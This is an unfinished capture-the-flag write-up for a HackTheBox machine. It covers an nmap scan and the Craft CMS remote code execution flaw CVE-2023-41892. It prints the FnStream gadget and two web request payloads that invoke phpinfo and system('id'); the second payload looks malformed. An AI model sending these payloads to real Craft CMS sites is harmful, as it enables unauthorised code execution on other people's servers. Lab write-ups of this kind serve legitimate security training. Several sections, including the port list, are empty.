# #1 Introduction
<img width="687" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/2158efa4-9724-430c-95f9-a5cbb772171f"># #1 Introduction

# #2 nmap

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx surveillance.htb
```

we run an nmap scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -sV -p- surveillance.htb
```

we got these open ports
```bash

```

# #3 user.txt

## HTTP (port 80)


Powered by Craft CMS
https://github.com/craftcms/cms/tree/4.4.14
https://threatprotect.qualys.com/2023/09/25/craft-cms-remote-code-execution-vulnerability-cve-2023-41892/

CVE-2023-41892
https://blog.calif.io/p/craftcms-rce

\GuzzleHttp\Psr7\FnStream

public function __destruct()
{
   if (isset($this->_fn_close)) {
       call_user_func($this->_fn_close);
   }
}


action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream","__construct()":[{"close":null}], "_fn_close":"phpinfo"}}

action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream","__construct()":[{"close":null}], "_fn_close":"function () {system('id');"}}
